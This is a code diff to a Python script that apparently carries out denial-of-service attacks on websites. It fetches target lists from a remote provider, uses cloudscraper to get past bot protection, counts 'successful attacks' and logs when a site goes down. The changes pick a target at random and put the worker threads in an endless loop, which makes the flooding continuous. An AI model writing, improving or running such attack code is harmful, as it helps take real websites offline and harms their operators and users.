@@ -9,6 +9,7 @@ from os import system
 from sys import stderr
 from threading import Thread
 from time import sleep
+from random import choice
 
 import cloudscraper
 from loguru import logger
@@ -58,6 +59,7 @@ def check_req():
     os.system("pip install -r requirements.txt")
     os.system("pip3 install -r requirements.txt")
 
+
 def mainth():
     result = 'processing'
     scraper = cloudscraper.create_scraper(
@@ -70,7 +72,7 @@ def mainth():
 
     logger.info("GET RESOURCES FOR ATTACK")
     try:
-        site = remoteProvider.get_target_site()
+        site = choice(remoteProvider.get_target_sites())
     except Exception as e:
         logger.exception(e)
         sleep(5)
@@ -107,7 +109,7 @@ def mainth():
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
     except ConnectionError as exc:
-        logger.success(f"{site} is down: {exc}")
+        logger.success(f"{site} is down")
         return result, site
     except Exception as exc:
         logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
@@ -137,8 +139,8 @@ if __name__ == '__main__':
     Thread(target=cleaner, daemon=True).start()
 
     with ThreadPoolExecutor(max_workers=threads) as executor:
-        future_tasks = [executor.submit(mainth) for _ in range(threads)]
-        for task in as_completed(future_tasks):
-            status, site = task.result()
-            logger.info(f"{status.upper()}: {site}")
-            executor.submit(mainth)
+        while True:
+            future_tasks = [executor.submit(mainth) for _ in range(threads)]
+            for task in as_completed(future_tasks):
+                status, site = task.result()
+                logger.info(f"{status.upper()}: {site}")
